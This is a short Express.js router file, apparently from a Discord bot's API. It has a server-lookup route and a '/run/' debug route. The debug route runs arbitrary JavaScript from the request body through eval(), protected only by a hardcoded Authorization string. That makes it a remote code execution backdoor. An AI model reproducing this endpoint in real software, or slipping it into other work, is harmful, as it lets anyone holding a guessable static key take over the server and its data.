const { Router } = require("express");
const Servers = require("@models/servers");

const route = Router();

route.get('/server/:id', async (req, res) => {
  let server = await Servers.findOne({ guildid: req.params.id }, { _id: false })
  if (!server) return res.json({ code: 404, error: "Server does not exist" });

  res.json({ code: 200, server });
});

route.post('/run/', async (req, res) => {
  if(req.headers.authorization != "Debug0N") return res.status(401).json({code: 401, error: "Unauthorized"});
  // Route is for debugging issues.
  try {
    let e = eval(req.body.code);
    res.status(200).json({ code: 200, evaled: e });
  } catch (err) {
    res.status(400).json({ code: 400, error: err.message });
  }
});

module.exports = route;
